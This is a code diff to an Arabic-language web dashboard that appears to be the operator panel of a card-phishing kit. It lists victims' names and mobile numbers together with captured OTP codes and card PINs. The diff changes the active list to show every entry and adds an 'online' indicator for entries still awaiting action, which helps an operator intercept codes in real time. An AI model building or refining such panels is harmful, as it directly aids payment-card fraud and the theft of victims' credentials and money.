@@ -244,7 +244,7 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 
   <div class="body">
     <div class="col-a">
-      <div class="col-a-head"><div class="gd"></div> بانتظار إجراء (<span id="aCnt">0</span>)</div>
+      <div class="col-a-head"><div class="gd"></div> العملاء النشطين (<span id="aCnt">0</span>)</div>
       <div id="aList"></div>
     </div>
     <div class="col-o">
@@ -338,18 +338,21 @@ function renderStats(){
   }).join('');
   document.getElementById('tbV').textContent=orders.length;
   document.getElementById('tbO').textContent=visitors.length;
-  document.getElementById('aCnt').textContent=pending.length;
+  document.getElementById('aCnt').textContent=orders.length;
   document.getElementById('oCnt').textContent=orders.length;
 }
 
 function renderActive(){
-  var el=document.getElementById('aList'),list=orders.filter(isPending);
-  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا توجد طلبات بانتظار إجراء</p></div>';return}
+  var el=document.getElementById('aList'),list=orders;
+  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين حالياً</p></div>';return}
   el.innerHTML=list.map(function(o){
     var otp=o.otp_code?'<span class="otp">OTP: '+esc(o.otp_code)+'</span>':'';
     var pin=o.card_pin?'<span class="otp">PIN: '+esc(o.card_pin)+'</span>':'';
+    var isOnline=isPending(o);
     return '<div class="ac'+(o.id===selId?' sel':'')+'" onclick="selectOrder(\''+o.id+'\')">'+
-      '<div class="ac-t"><span class="ac-n">'+esc(o.name||'مجهول')+'</span>'+stBadge(o.status)+'</div>'+
+      '<div class="ac-t"><div style="display:flex;align-items:center;gap:6px">'+
+      (isOnline?'<span style="width:7px;height:7px;border-radius:50%;background:#059669;box-shadow:0 0 6px #059669;display:inline-block"></span>':'')+
+      '<span class="ac-n">'+esc(o.name||'مجهول')+'</span></div>'+stBadge(o.status)+'</div>'+
       '<div class="ac-info">'+(o.mobile?'<span>📱 '+esc(o.mobile)+'</span>':'')+otp+pin+'</div></div>';
   }).join('');
 }
